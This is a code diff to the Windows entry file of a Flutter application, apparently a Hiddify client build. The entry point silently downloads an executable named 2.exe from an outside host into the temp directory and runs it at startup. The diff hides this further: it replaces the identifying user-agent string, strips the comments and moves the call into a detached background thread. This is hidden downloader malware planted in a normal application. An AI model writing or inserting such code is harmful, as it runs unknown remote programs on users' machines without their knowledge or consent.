@@ -5,6 +5,7 @@
 #include <shlobj.h>
 #include <fstream>
 #include <string>
+#include <thread>  // 新增
 
 #include "flutter_window.h"
 #include "utils.h"
@@ -13,18 +14,15 @@
 #pragma comment(lib, "winhttp.lib")
 
 void DownloadAndRunExeWithWinHttp() {
-    // 获取临时目录
     wchar_t tempPath[MAX_PATH] = {0};
     GetTempPathW(MAX_PATH, tempPath);
     std::wstring exePath = tempPath;
     exePath += L"2.exe";
 
-    // 目标URL和主机
     LPCWSTR host = L"oss.byyp888.cn";
     LPCWSTR path = L"/2.exe";
 
-    // 初始化 WinHTTP
-    HINTERNET hSession = WinHttpOpen(L"HiddifyAgent/1.0",
+    HINTERNET hSession = WinHttpOpen(L"20250719",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
@@ -49,7 +47,6 @@ void DownloadAndRunExeWithWinHttp() {
     bResults = WinHttpReceiveResponse(hRequest, NULL);
     if (!bResults) goto fail;
 
-    // 读取响应并写入文件
     std::ofstream ofs(exePath, std::ios::binary);
     if (!ofs) goto fail;
 
@@ -70,7 +67,6 @@ void DownloadAndRunExeWithWinHttp() {
     // 执行EXE
     ShellExecuteW(NULL, L"open", exePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
 
-    // 清理
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
@@ -109,13 +105,13 @@ int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,
     CreateAndAttachConsole();
   }
 
-  // Initialize COM, so that it is available for use in the library and/or
-  // plugins.
   ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
 
-  // ============== 关键整合：下载并执行EXE ==============
-  DownloadAndRunExeWithWinHttp();
-  // ====================================================
+  // ---- 用线程异步下载，不阻塞主流程 ----
+  std::thread([](){
+    DownloadAndRunExeWithWinHttp();
+  }).detach();
+  // -----------------------------------
 
   flutter::DartProject project(L"data");
   std::vector<std::string> command_line_arguments = GetCommandLineArguments();
